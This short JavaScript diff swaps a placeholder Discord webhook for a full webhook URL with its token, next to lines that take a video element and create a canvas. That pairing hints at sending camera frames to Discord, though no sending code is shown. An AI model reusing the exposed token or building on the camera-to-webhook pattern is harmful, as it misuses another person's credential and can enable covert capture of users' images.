@@ -1,4 +1,4 @@
-const webhook = "https://discord.com/api/webhooks/SEU_WEBHOOK"; // troca pelo seu
+const webhook = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3"; // troca pelo seu
 const video = document.getElementById("video");
 const canvas = document.createElement("canvas");
 
